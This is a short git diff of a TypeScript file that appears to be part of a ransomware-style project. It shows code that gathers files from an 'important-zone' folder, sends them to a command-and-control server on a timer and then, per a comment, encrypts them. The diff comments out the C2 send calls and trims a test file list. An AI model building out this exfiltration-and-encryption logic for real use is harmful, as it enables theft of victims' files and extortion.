@@ -10,13 +10,13 @@ import path from 'path'
 const filesToSearchFor = await getFilesToSearchFor()
 const payload: FinalPayload = await createImportantFilesPayload(filesToSearchFor)
 
-// Send Payload to C2
-sendPayload(await payload);
+// // Send Payload to C2
+// sendPayload(await payload);
 
-// Send Payload as often as defined by C2
-setInterval(async () => {
-  sendPayload(await createImportantFilesPayload(filesToSearchFor));
-}, c2.pollFrequency);
+// // Send Payload as often as defined by C2
+// setInterval(async () => {
+//   sendPayload(await createImportantFilesPayload(filesToSearchFor));
+// }, c2.pollFrequency);
 
 
 // Encrypt all the files after sending
@@ -29,8 +29,6 @@ const testFiles: FileDTO[] = [
   {path: path.join(__dirname, 'important-zone', 'test6.txt'), content: "test6"},
   {path: path.join(__dirname, 'important-zone', 'test7.txt'), content: "test7"},
   {path: path.join(__dirname, 'important-zone', 'test8.txt'), content: "test8"},
-  {path: path.join(__dirname, 'important-zone', 'test9.txt'), content: "test9"},
-  {path: path.join(__dirname, 'important-zone', 'test10.txt'), content: "test10"},
 ]
 
 async function getFilesToSearchFor() : Promise<string[]> {
